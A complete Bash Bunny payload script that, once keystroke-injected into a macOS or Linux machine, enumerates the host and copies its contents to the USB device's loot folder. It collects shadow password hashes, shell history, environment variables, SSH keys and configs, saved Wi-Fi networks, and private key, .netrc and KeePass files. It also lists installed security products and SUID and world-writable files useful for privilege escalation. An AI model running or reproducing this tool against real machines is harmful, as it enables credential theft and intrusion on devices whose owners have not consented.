#!/usr/bin/env bash
# =============================================================================
#  Payload   : cross-platform-enum / Unix component
#  Author    : <operator>
#  Device    : Bash Bunny (Mk I / Mk II)
#  Target OS : macOS 10.9+, Linux (Debian/RHEL/Arch/Alpine/BSDs), Android (ADB
#              shell), ChromeOS, Raspberry Pi OS, OpenWrt, ESXi shell
#  Purpose   : OS, device, user, and network enumeration; writes TXT + JSON
#              to the Bash Bunny loot directory on the STORAGE partition.
#  Deploy    : Called by payload.txt via injected terminal command
# =============================================================================

set -o noglob        # prevent glob expansion in enumerations
export LANG=C        # consistent output regardless of locale
export PATH="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH"

# ── Locate Bash Bunny STORAGE mount point ─────────────────────────────────────
find_bb_mount() {
    # macOS
    if [ -d "/Volumes/BashBunny" ]; then echo "/Volumes/BashBunny"; return; fi
    # Linux — systemd automount (most distros)
    local user; user="$(whoami)"
    for p in "/run/media/$user/BashBunny" "/media/$user/BashBunny" "/media/BashBunny"; do
        [ -d "$p" ] && echo "$p" && return
    done
    # ChromeOS
    local cros; cros=$(find /media/removable -maxdepth 1 -name 'BashBunny' 2>/dev/null | head -1)
    [ -n "$cros" ] && echo "$cros" && return
    # Fallback: search /mnt and /media
    local found; found=$(find /mnt /media -maxdepth 3 -name 'payload.txt' 2>/dev/null | head -1)
    [ -n "$found" ] && dirname "$found" && return
    # Last resort: use script's own directory
    echo "$(cd "$(dirname "$0")" && pwd)"
}

BB_MOUNT="$(find_bb_mount)"
HOSTNAME_VAL="$(hostname 2>/dev/null | tr -d '\n')"
TIMESTAMP="$(date '+%Y%m%d_%H%M%S' 2>/dev/null)"
LOOT_DIR="$BB_MOUNT/loot/enum_${HOSTNAME_VAL}_${TIMESTAMP}"
mkdir -p "$LOOT_DIR" 2>/dev/null || { mkdir -p /tmp/bb_loot_$$ && LOOT_DIR=/tmp/bb_loot_$$; }

TXT="$LOOT_DIR/enum_unix.txt"
JSON="$LOOT_DIR/enum_unix.json"

# ── Safe command runner ────────────────────────────────────────────────────────
s() {
    # s <cmd...> — run command, return output or "N/A" on failure/empty
    local out; out="$("$@" 2>/dev/null)"
    if [ -n "$out" ]; then printf '%s' "$out"; else printf 'N/A'; fi
}

# ── Detect OS family ──────────────────────────────────────────────────────────
detect_os() {
    if [ -f /etc/os-release ]; then
        . /etc/os-release
        OS_NAME="${PRETTY_NAME:-$NAME}"
        OS_ID="${ID:-linux}"
        OS_VERSION="${VERSION_ID:-unknown}"
    elif [ -f /etc/redhat-release ]; then
        OS_NAME="$(cat /etc/redhat-release)"; OS_ID="rhel"; OS_VERSION="$(grep -oP '\d+\.\d+' /etc/redhat-release | head -1)"
    elif [ -f /etc/debian_version ]; then
        OS_NAME="Debian $(cat /etc/debian_version)"; OS_ID="debian"; OS_VERSION="$(cat /etc/debian_version)"
    elif [ -f /etc/alpine-release ]; then
        OS_NAME="Alpine $(cat /etc/alpine-release)"; OS_ID="alpine"; OS_VERSION="$(cat /etc/alpine-release)"
    else
        OS_NAME="$(uname -s)"; OS_ID="$(uname -s | tr '[:upper:]' '[:lower:]')"; OS_VERSION="$(uname -r)"
    fi

    SYS="$(uname -s 2>/dev/null)"
    case "$SYS" in
        Darwin)  PLATFORM="macOS" ;;
        Linux)   PLATFORM="Linux" ;;
        FreeBSD) PLATFORM="FreeBSD" ;;
        OpenBSD) PLATFORM="OpenBSD" ;;
        *)       PLATFORM="$SYS" ;;
    esac
}
detect_os

# ── macOS helpers ─────────────────────────────────────────────────────────────
sw_vers_val() { sw_vers -productVersion 2>/dev/null || echo "N/A"; }
system_profiler_val() { system_profiler "$1" 2>/dev/null | grep "$2" | head -1 | awk -F': ' '{print $2}' | xargs; }

# ═══════════════════════════════════════════════════════════════════════════════
# SECTION 1 — OPERATING SYSTEM
# ═══════════════════════════════════════════════════════════════════════════════
KERNEL="$(uname -r 2>/dev/null)"
ARCH="$(uname -m 2>/dev/null)"
HOSTNAME_FULL="$(hostname -f 2>/dev/null || hostname 2>/dev/null)"

if [ "$PLATFORM" = "macOS" ]; then
    OS_NAME_FULL="macOS $(sw_vers -productName 2>/dev/null) $(sw_vers -productVersion 2>/dev/null) (Build $(sw_vers -buildVersion 2>/dev/null))"
    OS_CODENAME="$(awk '/SOFTWARE LICENSE AGREEMENT FOR macOS/' '/System/Library/CoreServices/Setup Assistant.app/Contents/Resources/en.lproj/OSXSoftwareLicense.rtf' 2>/dev/null | grep -o 'macOS [A-Za-z ]*' | head -1 || echo 'N/A')"
    INSTALL_DATE="$(s ls -lT /var/db/.AppleSetupDone)"
    UPTIME_VAL="$(s uptime)"
    LAST_BOOT="$(s sysctl -n kern.boottime | grep -oE '[0-9]{10}' | xargs -I{} date -r {} '+%Y-%m-%d %H:%M:%S' 2>/dev/null)"
else
    OS_NAME_FULL="${OS_NAME:-$(uname -s)}"
    OS_CODENAME="${VERSION_CODENAME:-N/A}"
    INSTALL_DATE="$(s stat -c '%y' /lost+found 2>/dev/null || s stat -c '%y' / 2>/dev/null)"
    UPTIME_VAL="$(s uptime -p 2>/dev/null || s uptime)"
    LAST_BOOT="$(s who -b 2>/dev/null || s last reboot 2>/dev/null | head -1)"
fi

TIMEZONE="$(s timedatectl show -p Timezone --value 2>/dev/null || s cat /etc/timezone 2>/dev/null || s readlink /etc/localtime | sed 's|.*/zoneinfo/||')"
LOCALE_VAL="$(s locale 2>/dev/null | head -5)"

# ═══════════════════════════════════════════════════════════════════════════════
# SECTION 2 — HARDWARE / DEVICE
# ═══════════════════════════════════════════════════════════════════════════════
if [ "$PLATFORM" = "macOS" ]; then
    HW_MODEL="$(system_profiler_val SPHardwareDataType 'Model Name')"
    HW_IDENTIFIER="$(system_profiler_val SPHardwareDataType 'Model Identifier')"
    HW_SERIAL="$(system_profiler_val SPHardwareDataType 'Serial Number')"
    CPU_INFO="$(system_profiler_val SPHardwareDataType 'Chip\|Processor Name'): $(system_profiler_val SPHardwareDataType 'Total Number of Cores') cores @ $(system_profiler_val SPHardwareDataType 'Processor Speed')"
    RAM_TOTAL="$(system_profiler_val SPHardwareDataType 'Memory')"
    RAM_FREE="$(s vm_stat | awk '/Pages free/{printf "%.0fMB", $3*4096/1024/1024}')"
    DISK_INFO="$(s df -H | grep -v tmpfs)"
    GPU_INFO="$(system_profiler_val SPDisplaysDataType 'Chipset Model')"
    BATTERY="$(s pmset -g batt | tail -1)"
else
    HW_MODEL="$(s cat /sys/class/dmi/id/product_name 2>/dev/null || s dmidecode -s system-product-name 2>/dev/null)"
    HW_IDENTIFIER="$(s cat /sys/class/dmi/id/product_version 2>/dev/null)"
    HW_SERIAL="$(s cat /sys/class/dmi/id/product_serial 2>/dev/null || s dmidecode -s system-serial-number 2>/dev/null)"
    CPU_INFO="$(s grep -m1 'model name' /proc/cpuinfo | cut -d: -f2 | xargs) | $(s nproc) cores"
    RAM_TOTAL="$(s awk '/MemTotal/{printf "%.1f GB", $2/1024/1024}' /proc/meminfo)"
    RAM_FREE="$(s awk '/MemAvailable/{printf "%.1f GB", $2/1024/1024}' /proc/meminfo)"
    DISK_INFO="$(s df -h | grep -v tmpfs | grep -v devtmpfs)"
    GPU_INFO="$(s lspci 2>/dev/null | grep -iE 'vga|3d|display' | head -3 || s cat /sys/class/graphics/fb0/name 2>/dev/null)"
    BATTERY="$(s upower -i $(upower -e 2>/dev/null | grep BAT) 2>/dev/null | grep -E 'state|percentage|time to' | head -5)"
fi

BIOS_INFO="$(s cat /sys/class/dmi/id/bios_version 2>/dev/null || s dmidecode -s bios-version 2>/dev/null)"
BIOS_DATE="$(s cat /sys/class/dmi/id/bios_date 2>/dev/null || s dmidecode -s bios-release-date 2>/dev/null)"

# Virtualization detection
VM_CHECK="$(s systemd-detect-virt 2>/dev/null)"
if [ -z "$VM_CHECK" ] || [ "$VM_CHECK" = "none" ] || [ "$VM_CHECK" = "N/A" ]; then
    for sig in "VirtualBox" "VMware" "QEMU" "KVM" "Xen" "Hyper-V" "Parallels" "bhyve"; do
        if grep -qsi "$sig" /proc/cpuinfo /proc/scsi/scsi /sys/class/dmi/id/product_name 2>/dev/null ||
           dmesg 2>/dev/null | grep -qsi "$sig"; then
            VM_CHECK="$sig"; break
        fi
    done
fi
[ -z "$VM_CHECK" ] && VM_CHECK="No (or undetectable)"

# ═══════════════════════════════════════════════════════════════════════════════
# SECTION 3 — USER & ACCOUNTS
# ═══════════════════════════════════════════════════════════════════════════════
CUR_USER="$(id -un 2>/dev/null)"
CUR_UID="$(id -u 2>/dev/null)"
CUR_GID="$(id -g 2>/dev/null)"
CUR_GROUPS="$(id -Gn 2>/dev/null)"
IS_ROOT="$([ "$CUR_UID" = "0" ] && echo 'Yes' || echo 'No')"
SUDO_PRIVS="$(s sudo -l -n 2>/dev/null || echo 'N/A (no sudo or password required)')"
HOME_DIR="$HOME"
SHELL_VAL="$SHELL"

# All local users
LOCAL_USERS="$(s getent passwd 2>/dev/null | awk -F: '$7 !~ /nologin|false/ {printf "%s (uid=%s gid=%s home=%s shell=%s)\n",$1,$3,$4,$6,$7}' || \
              s awk -F: '$7 !~ /nologin|false/ {printf "%s (uid=%s gid=%s home=%s shell=%s)\n",$1,$3,$4,$6,$7}' /etc/passwd)"
LOCAL_GROUPS="$(s getent group 2>/dev/null || s cat /etc/group)"
SHADOW_HASHES="$(s sudo cat /etc/shadow 2>/dev/null | awk -F: '$2 ~ /^\$/ {print $1": "$2}')"

# Login history
LAST_LOGINS="$(s last -n 20 2>/dev/null || s lastlog 2>/dev/null | grep -v 'Never' | head -20)"
WHO_NOW="$(s w 2>/dev/null || s who 2>/dev/null)"
FAILED_LOGINS="$(s lastb -n 20 2>/dev/null || s grep 'Failed password' /var/log/auth.log 2>/dev/null | tail -20 || \
                 s grep 'Failed password' /var/log/secure 2>/dev/null | tail -20)"

# SSH
SSH_DIR="$HOME/.ssh"
SSH_KEYS="$([ -d "$SSH_DIR" ] && ls -la "$SSH_DIR" 2>/dev/null || echo 'N/A')"
SSH_AUTH_KEYS="$(s cat "$SSH_DIR/authorized_keys" 2>/dev/null)"
SSH_KNOWN_HOSTS="$(s cat "$SSH_DIR/known_hosts" 2>/dev/null | head -20)"
SSH_CONFIG="$(s cat "$SSH_DIR/config" 2>/dev/null)"

# Shell history
if [ "$PLATFORM" = "macOS" ]; then
    BASH_HIST="$(s tail -50 ~/.bash_history 2>/dev/null)"
    ZSH_HIST="$(s tail -50 ~/.zsh_history 2>/dev/null | sed 's/^:[0-9]*:[0-9]*;//')"
    SHELL_HIST="$ZSH_HIST\n--- bash ---\n$BASH_HIST"
else
    SHELL_HIST="$(s tail -50 ~/.bash_history 2>/dev/null)"
    [ -f ~/.zsh_history ] && SHELL_HIST="$SHELL_HIST\n$(tail -50 ~/.zsh_history 2>/dev/null | sed 's/^:[0-9]*:[0-9]*;//')"
fi

ENV_VARS="$(s env 2>/dev/null | sort)"
CRON_USER="$(s crontab -l 2>/dev/null)"
PASSWD_POLICY="$(s chage -l "$CUR_USER" 2>/dev/null || s pwpolicy getaccountpolicies 2>/dev/null)"

# Credential files in home
INTERESTING_FILES="$(find "$HOME" /root -maxdepth 4 \( \
    -name '*.pem' -o -name '*.key' -o -name '*.p12' -o -name '*.pfx' \
    -o -name 'id_rsa' -o -name 'id_dsa' -o -name 'id_ecdsa' -o -name 'id_ed25519' \
    -o -name '.netrc' -o -name '.pgpass' -o -name 'credentials' \
    -o -name '*.kdbx' -o -name '*.kwallet' \
    \) -ls 2>/dev/null | head -30)"

# ═══════════════════════════════════════════════════════════════════════════════
# SECTION 4 — NETWORK
# ═══════════════════════════════════════════════════════════════════════════════
if [ "$PLATFORM" = "macOS" ]; then
    INTERFACES="$(s ifconfig 2>/dev/null)"
    DEFAULT_GW="$(s netstat -nr | awk '/default/{print $2; exit}')"
    DNS_SERVERS="$(s scutil --dns 2>/dev/null | grep 'nameserver\[' | awk '{print $3}' | sort -u)"
    WIFI_SSIDS="$(s /System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport -s 2>/dev/null | head -20)"
    SAVED_WIFI="$(s networksetup -listpreferredwirelessnetworks en0 2>/dev/null || \
                  s networksetup -listpreferredwirelessnetworks en1 2>/dev/null)"
    ACTIVE_CONNS="$(s netstat -an 2>/dev/null)"
    LISTEN_PORTS="$(s netstat -an | grep LISTEN)"
    ARP_TABLE="$(s arp -an 2>/dev/null)"
    ROUTES="$(s netstat -nr 2>/dev/null)"
    HOSTS_FILE="$(s grep -v '^#' /etc/hosts | grep -v '^[[:space:]]*$')"
    FIREWALL_STATE="$(s /usr/libexec/ApplicationFirewall/socketfilterfw --getglobalstate 2>/dev/null)"
    OPEN_PORTS="$(s lsof -nP -iTCP -sTCP:LISTEN 2>/dev/null | head -40)"
    PROXY_SETTINGS="$(s scutil --proxy 2>/dev/null)"
    PUBLIC_IP="$(curl -s --max-time 5 https://api.ipify.org 2>/dev/null || curl -s --max-time 5 https://ifconfig.me 2>/dev/null)"
    SHARES="$(s sharing -l 2>/dev/null)"
    NFS_SHARES="$(s nfsd status 2>/dev/null)"
else
    INTERFACES="$(s ip addr show 2>/dev/null || s ifconfig -a 2>/dev/null)"
    DEFAULT_GW="$(s ip route | awk '/default/{print $3; exit}' || s route -n | awk '/^0\.0\.0\.0/{print $2; exit}')"
    DNS_SERVERS="$(s grep 'nameserver' /etc/resolv.conf | awk '{print $2}')"
    WIFI_SSIDS="$(s nmcli dev wifi list 2>/dev/null | head -20 || s iwlist scan 2>/dev/null | grep -E 'ESSID|Quality' | head -30)"
    SAVED_WIFI="$(s nmcli -t -f NAME,DEVICE con show 2>/dev/null | head -20)"
    ACTIVE_CONNS="$(s ss -tupn 2>/dev/null || s netstat -tupn 2>/dev/null)"
    LISTEN_PORTS="$(s ss -tlnp 2>/dev/null || s netstat -tlnp 2>/dev/null)"
    ARP_TABLE="$(s arp -n 2>/dev/null || s ip neigh show 2>/dev/null)"
    ROUTES="$(s ip route show 2>/dev/null || s route -n 2>/dev/null)"
    HOSTS_FILE="$(s grep -v '^#' /etc/hosts | grep -v '^[[:space:]]*$')"
    FIREWALL_STATE="$(s iptables -L -n --line-numbers 2>/dev/null | head -60 || \
                      s nft list ruleset 2>/dev/null | head -60 || \
                      s ufw status verbose 2>/dev/null)"
    OPEN_PORTS="$(s ss -tlnp 2>/dev/null || s netstat -tlnp 2>/dev/null)"
    PROXY_SETTINGS="echo ${http_proxy:-N/A} / ${https_proxy:-N/A} / ${no_proxy:-N/A}"
    PUBLIC_IP="$(curl -s --max-time 5 https://api.ipify.org 2>/dev/null || wget -qO- --timeout=5 https://api.ipify.org 2>/dev/null)"
    SHARES="$(s showmount -e localhost 2>/dev/null)"
    NFS_SHARES="$(s cat /etc/exports 2>/dev/null)"
fi

# DNS cache
DNS_CACHE="$(s systemd-resolve --statistics 2>/dev/null | head -10 || \
             s scutil --dns 2>/dev/null | head -20 || echo 'N/A')"

# ═══════════════════════════════════════════════════════════════════════════════
# SECTION 5 — SECURITY POSTURE
# ═══════════════════════════════════════════════════════════════════════════════
if [ "$PLATFORM" = "macOS" ]; then
    SIP_STATUS="$(s csrutil status 2>/dev/null)"
    GATEKEEPER="$(s spctl --status 2>/dev/null)"
    FILEVAULT="$(s fdesetup status 2>/dev/null)"
    SECURITY_TOOLS="$(s ls /Applications/ | grep -iE 'carbon|crowdstrike|sentinel|malwarebytes|avast|sophos|symantec|kaspersky|eset|trend|mcafee|norton|bitdefender')"
    LOADED_KERNEL_EXT="$(s kextstat 2>/dev/null | grep -v 'com.apple' | head -20 || \
                          s systemextensionsctl list 2>/dev/null | head -20)"
else
    SIP_STATUS="N/A (Linux)"
    GATEKEEPER="N/A (Linux)"
    FILEVAULT="N/A"
    SECURITY_TOOLS="$(s which rkhunter lynis aide tripwire auditd clamav 2>/dev/null | tr '\n' ' ')"
    LOADED_KERNEL_EXT="$(s lsmod 2>/dev/null | head -30)"
fi

SELINUX="$(s sestatus 2>/dev/null || s getenforce 2>/dev/null || echo 'N/A')"
APPARMOR="$(s apparmor_status 2>/dev/null | head -5 || echo 'N/A')"
AUDIT_RULES="$(s auditctl -l 2>/dev/null | head -20 || echo 'N/A')"
PASSWD_FILE_PERMS="$(s ls -la /etc/passwd /etc/shadow /etc/sudoers 2>/dev/null)"
SUID_BINS="$(find / -perm -4000 -type f 2>/dev/null | head -30)"
WORLD_WRITABLE="$(find / -perm -o+w -not -path '/proc/*' -not -path '/sys/*' -type f 2>/dev/null | head -20)"
SUDO_VERSION="$(s sudo -V 2>/dev/null | head -1)"

# ═══════════════════════════════════════════════════════════════════════════════
# SECTION 6 — PROCESSES, SERVICES, PERSISTENCE
# ═══════════════════════════════════════════════════════════════════════════════
PROCESSES="$(s ps auxf 2>/dev/null | head -80 || s ps aux 2>/dev/null | head -80)"

if [ "$PLATFORM" = "macOS" ]; then
    SERVICES="$(s launchctl list 2>/dev/null | grep -v '^-' | head -50)"
    STARTUP_ITEMS="$(s ls -la /Library/LaunchDaemons/ /Library/LaunchAgents/ "$HOME/Library/LaunchAgents/" 2>/dev/null)"
else
    SERVICES="$(s systemctl list-units --type=service --state=running 2>/dev/null | head -40 || \
                s service --status-all 2>/dev/null | grep '+' | head -40)"
    STARTUP_ITEMS="$(s systemctl list-unit-files --type=service --state=enabled 2>/dev/null | head -40 || \
                     s ls /etc/init.d/ 2>/dev/null)"
fi

CRON_SYSTEM="$(s cat /etc/crontab 2>/dev/null; s ls /etc/cron.d/ /etc/cron.daily/ /etc/cron.hourly/ /etc/cron.weekly/ /etc/cron.monthly/ 2>/dev/null)"
AT_JOBS="$(s atq 2>/dev/null)"

# ═══════════════════════════════════════════════════════════════════════════════
# SECTION 7 — INSTALLED SOFTWARE
# ═══════════════════════════════════════════════════════════════════════════════
if [ "$PLATFORM" = "macOS" ]; then
    INSTALLED_SW="$(s ls /Applications/ 2>/dev/null; s system_profiler SPApplicationsDataType 2>/dev/null | grep -E '^\s+\w.*:$' | sed 's/://;s/^ *//' | head -80)"
    PKG_MANAGER="Homebrew"
    INSTALLED_PKGS="$(s brew list 2>/dev/null | head -60 || echo 'N/A')"
elif command -v dpkg >/dev/null 2>&1; then
    INSTALLED_SW="$(s dpkg -l 2>/dev/null | awk '/^ii/{print $2, $3}' | head -80)"
    PKG_MANAGER="apt/dpkg"
    INSTALLED_PKGS="$INSTALLED_SW"
elif command -v rpm >/dev/null 2>&1; then
    INSTALLED_SW="$(s rpm -qa --queryformat '%{name} %{version}\n' 2>/dev/null | sort | head -80)"
    PKG_MANAGER="rpm/yum/dnf"
    INSTALLED_PKGS="$INSTALLED_SW"
elif command -v apk >/dev/null 2>&1; then
    INSTALLED_SW="$(s apk info 2>/dev/null | head -60)"
    PKG_MANAGER="apk (Alpine)"
    INSTALLED_PKGS="$INSTALLED_SW"
elif command -v pacman >/dev/null 2>&1; then
    INSTALLED_SW="$(s pacman -Q 2>/dev/null | head -80)"
    PKG_MANAGER="pacman (Arch)"
    INSTALLED_PKGS="$INSTALLED_SW"
else
    INSTALLED_SW="$(s which python python3 perl ruby java node go gcc curl wget nmap tcpdump 2>/dev/null)"
    PKG_MANAGER="unknown"
    INSTALLED_PKGS="$INSTALLED_SW"
fi

# ═══════════════════════════════════════════════════════════════════════════════
# BUILD TXT REPORT
# ═══════════════════════════════════════════════════════════════════════════════
DIVIDER="$(printf '=%.0s' {1..72})"
cat > "$TXT" <<TXTREPORT
$DIVIDER
  HAK5 BASH BUNNY — CROSS-PLATFORM ENUMERATION REPORT
  Host      : $HOSTNAME_FULL
  Timestamp : $(date '+%Y-%m-%d %H:%M:%S %Z')
  Platform  : $PLATFORM
$DIVIDER

── OPERATING SYSTEM ──────────────────────────────────────────────────────────
OS              : $OS_NAME_FULL
Codename        : $OS_CODENAME
Kernel          : $(uname -srv 2>/dev/null)
Architecture    : $ARCH
Install Date    : $INSTALL_DATE
Last Boot       : $LAST_BOOT
Uptime          : $UPTIME_VAL
Timezone        : $TIMEZONE
Locale:
$LOCALE_VAL

── HARDWARE / DEVICE ─────────────────────────────────────────────────────────
Hostname        : $HOSTNAME_FULL
Model           : $HW_MODEL
Identifier      : $HW_IDENTIFIER
Serial Number   : $HW_SERIAL
Virtual Machine : $VM_CHECK
BIOS/Firmware   : $BIOS_INFO ($BIOS_DATE)
RAM Total       : $RAM_TOTAL
RAM Free        : $RAM_FREE
Battery         : $BATTERY

CPU:
$CPU_INFO

GPU:
$GPU_INFO

Disks:
$DISK_INFO

── CURRENT USER ──────────────────────────────────────────────────────────────
Username        : $CUR_USER (UID=$CUR_UID GID=$CUR_GID)
Is Root/Admin   : $IS_ROOT
Groups          : $CUR_GROUPS
Home Directory  : $HOME_DIR
Shell           : $SHELL_VAL

Sudo Privileges:
$SUDO_PRIVS

── LOCAL USERS ───────────────────────────────────────────────────────────────
$LOCAL_USERS

── LOCAL GROUPS ──────────────────────────────────────────────────────────────
$LOCAL_GROUPS

── SHADOW / PASSWORD HASHES (if readable) ────────────────────────────────────
$SHADOW_HASHES

── PASSWORD POLICY ───────────────────────────────────────────────────────────
$PASSWD_POLICY

── CURRENTLY LOGGED IN ───────────────────────────────────────────────────────
$WHO_NOW

── LOGIN HISTORY (last 20) ───────────────────────────────────────────────────
$LAST_LOGINS

── FAILED LOGIN ATTEMPTS ─────────────────────────────────────────────────────
$FAILED_LOGINS

── SSH KEYS ──────────────────────────────────────────────────────────────────
$SSH_KEYS
Authorized Keys:
$SSH_AUTH_KEYS
Known Hosts (first 20):
$SSH_KNOWN_HOSTS
SSH Config:
$SSH_CONFIG

── SHELL HISTORY (last 50 lines) ─────────────────────────────────────────────
$(printf '%b' "$SHELL_HIST")

── INTERESTING CREDENTIAL FILES ──────────────────────────────────────────────
$INTERESTING_FILES

── ENVIRONMENT VARIABLES ─────────────────────────────────────────────────────
$ENV_VARS

── USER CRONTAB ──────────────────────────────────────────────────────────────
$CRON_USER

── NETWORK INTERFACES ────────────────────────────────────────────────────────
$INTERFACES

Default Gateway : $DEFAULT_GW
Public IP       : $PUBLIC_IP

── DNS SERVERS ───────────────────────────────────────────────────────────────
$DNS_SERVERS

── DNS CACHE ─────────────────────────────────────────────────────────────────
$DNS_CACHE

── ARP TABLE ─────────────────────────────────────────────────────────────────
$ARP_TABLE

── ROUTING TABLE ─────────────────────────────────────────────────────────────
$ROUTES

── ACTIVE CONNECTIONS ────────────────────────────────────────────────────────
$ACTIVE_CONNS

── LISTENING PORTS ───────────────────────────────────────────────────────────
$LISTEN_PORTS

── HOSTS FILE ────────────────────────────────────────────────────────────────
$HOSTS_FILE

── PROXY SETTINGS ────────────────────────────────────────────────────────────
$PROXY_SETTINGS

── WIFI NETWORKS ─────────────────────────────────────────────────────────────
Visible:
$WIFI_SSIDS
Saved Profiles:
$SAVED_WIFI

── SHARES / NFS ──────────────────────────────────────────────────────────────
$SHARES
$NFS_SHARES

── FIREWALL ──────────────────────────────────────────────────────────────────
$FIREWALL_STATE

── SECURITY TOOLS ────────────────────────────────────────────────────────────
macOS SIP       : $SIP_STATUS
Gatekeeper      : $GATEKEEPER
FileVault/LUKS  : $FILEVAULT
SELinux         : $SELINUX
AppArmor        : $APPARMOR
Security Tools  : $SECURITY_TOOLS

Kernel Modules / Extensions (non-Apple):
$LOADED_KERNEL_EXT

Audit Rules:
$AUDIT_RULES

── SUID BINARIES (first 30) ──────────────────────────────────────────────────
$SUID_BINS

── WORLD-WRITABLE FILES (first 20) ──────────────────────────────────────────
$WORLD_WRITABLE

── FILE PERMISSIONS ──────────────────────────────────────────────────────────
$PASSWD_FILE_PERMS

── RUNNING PROCESSES (top 80) ────────────────────────────────────────────────
$PROCESSES

── SERVICES (running) ────────────────────────────────────────────────────────
$SERVICES

── STARTUP / PERSISTENCE ─────────────────────────────────────────────────────
$STARTUP_ITEMS

── SYSTEM CRON ───────────────────────────────────────────────────────────────
$CRON_SYSTEM

── AT JOBS ───────────────────────────────────────────────────────────────────
$AT_JOBS

── INSTALLED SOFTWARE ($PKG_MANAGER, first 80) ──────────────────────────────
$INSTALLED_PKGS

$DIVIDER
  END OF REPORT
$DIVIDER
TXTREPORT

# ═══════════════════════════════════════════════════════════════════════════════
# BUILD JSON REPORT
# ═══════════════════════════════════════════════════════════════════════════════

# JSON helpers
jstr() {
    # jstr <value> — output a JSON-safe quoted string
    local v="$1"
    v="${v//\\/\\\\}"      # backslash
    v="${v//\"/\\\"}"      # double-quote
    v="${v//$'\n'/\\n}"    # newline
    v="${v//$'\r'/\\r}"    # carriage return
    v="${v//$'\t'/\\t}"    # tab
    printf '"%s"' "$v"
}
jarr() {
    # jarr <multiline-string> — output JSON array of strings
    local input="$1"
    if [ -z "$input" ] || [ "$input" = "N/A" ]; then echo '[]'; return; fi
    local result='['
    local first=1
    while IFS= read -r line; do
        [ -z "$line" ] && continue
        [ "$first" = "1" ] && first=0 || result="$result,"
        result="$result
    $(jstr "$line")"
    done <<EOF
$input
EOF
    result="$result
  ]"
    echo "$result"
}

cat > "$JSON" <<JSONREPORT
{
  "meta": {
    "tool": "Bash Bunny cross-platform-enum",
    "platform": $(jstr "$PLATFORM"),
    "hostname": $(jstr "$HOSTNAME_FULL"),
    "timestamp": "$(date -u '+%Y-%m-%dT%H:%M:%SZ')"
  },
  "os": {
    "name": $(jstr "$OS_NAME_FULL"),
    "codename": $(jstr "$OS_CODENAME"),
    "kernel": $(jstr "$(uname -srv 2>/dev/null)"),
    "architecture": $(jstr "$ARCH"),
    "install_date": $(jstr "$INSTALL_DATE"),
    "last_boot": $(jstr "$LAST_BOOT"),
    "uptime": $(jstr "$UPTIME_VAL"),
    "timezone": $(jstr "$TIMEZONE")
  },
  "hardware": {
    "hostname": $(jstr "$HOSTNAME_FULL"),
    "model": $(jstr "$HW_MODEL"),
    "identifier": $(jstr "$HW_IDENTIFIER"),
    "serial": $(jstr "$HW_SERIAL"),
    "virtual_machine": $(jstr "$VM_CHECK"),
    "bios_version": $(jstr "$BIOS_INFO"),
    "bios_date": $(jstr "$BIOS_DATE"),
    "cpu": $(jstr "$CPU_INFO"),
    "gpu": $(jstr "$GPU_INFO"),
    "ram_total": $(jstr "$RAM_TOTAL"),
    "ram_free": $(jstr "$RAM_FREE"),
    "battery": $(jstr "$BATTERY"),
    "disks": $(jarr "$DISK_INFO")
  },
  "user": {
    "username": $(jstr "$CUR_USER"),
    "uid": $(jstr "$CUR_UID"),
    "gid": $(jstr "$CUR_GID"),
    "is_root": $(jstr "$IS_ROOT"),
    "groups": $(jstr "$CUR_GROUPS"),
    "home": $(jstr "$HOME_DIR"),
    "shell": $(jstr "$SHELL_VAL"),
    "sudo_privs": $(jstr "$SUDO_PRIVS"),
    "passwd_policy": $(jstr "$PASSWD_POLICY"),
    "ssh_authorized_keys": $(jarr "$SSH_AUTH_KEYS"),
    "ssh_known_hosts": $(jarr "$SSH_KNOWN_HOSTS"),
    "shell_history": $(jarr "$(printf '%b' "$SHELL_HIST")"),
    "crontab": $(jstr "$CRON_USER"),
    "interesting_files": $(jarr "$INTERESTING_FILES")
  },
  "local_accounts": {
    "users": $(jarr "$LOCAL_USERS"),
    "groups": $(jarr "$LOCAL_GROUPS"),
    "shadow_hashes": $(jarr "$SHADOW_HASHES"),
    "who_now": $(jarr "$WHO_NOW"),
    "last_logins": $(jarr "$LAST_LOGINS"),
    "failed_logins": $(jarr "$FAILED_LOGINS")
  },
  "network": {
    "interfaces": $(jstr "$INTERFACES"),
    "default_gateway": $(jstr "$DEFAULT_GW"),
    "public_ip": $(jstr "$PUBLIC_IP"),
    "dns_servers": $(jarr "$DNS_SERVERS"),
    "dns_cache": $(jstr "$DNS_CACHE"),
    "arp_table": $(jarr "$ARP_TABLE"),
    "routing_table": $(jarr "$ROUTES"),
    "active_connections": $(jarr "$ACTIVE_CONNS"),
    "listening_ports": $(jarr "$LISTEN_PORTS"),
    "hosts_file": $(jarr "$HOSTS_FILE"),
    "proxy": $(jstr "$PROXY_SETTINGS"),
    "wifi_visible": $(jarr "$WIFI_SSIDS"),
    "wifi_saved": $(jarr "$SAVED_WIFI"),
    "shares": $(jarr "$SHARES"),
    "nfs": $(jstr "$NFS_SHARES"),
    "firewall": $(jstr "$FIREWALL_STATE")
  },
  "security": {
    "sip": $(jstr "$SIP_STATUS"),
    "gatekeeper": $(jstr "$GATEKEEPER"),
    "filevault_luks": $(jstr "$FILEVAULT"),
    "selinux": $(jstr "$SELINUX"),
    "apparmor": $(jstr "$APPARMOR"),
    "security_tools": $(jstr "$SECURITY_TOOLS"),
    "kernel_modules": $(jarr "$LOADED_KERNEL_EXT"),
    "audit_rules": $(jarr "$AUDIT_RULES"),
    "suid_bins": $(jarr "$SUID_BINS"),
    "world_writable": $(jarr "$WORLD_WRITABLE"),
    "sensitive_perms": $(jstr "$PASSWD_FILE_PERMS")
  },
  "persistence": {
    "services_running": $(jarr "$SERVICES"),
    "startup_items": $(jarr "$STARTUP_ITEMS"),
    "system_cron": $(jstr "$CRON_SYSTEM"),
    "at_jobs": $(jstr "$AT_JOBS")
  },
  "software": {
    "package_manager": $(jstr "$PKG_MANAGER"),
    "installed": $(jarr "$INSTALLED_PKGS"),
    "processes_top80": $(jarr "$PROCESSES")
  },
  "environment": $(jarr "$ENV_VARS")
}
JSONREPORT

# Signal completion
printf 'OK %s\n' "$(date -u '+%Y-%m-%dT%H:%M:%SZ')" > "$LOOT_DIR/.done"
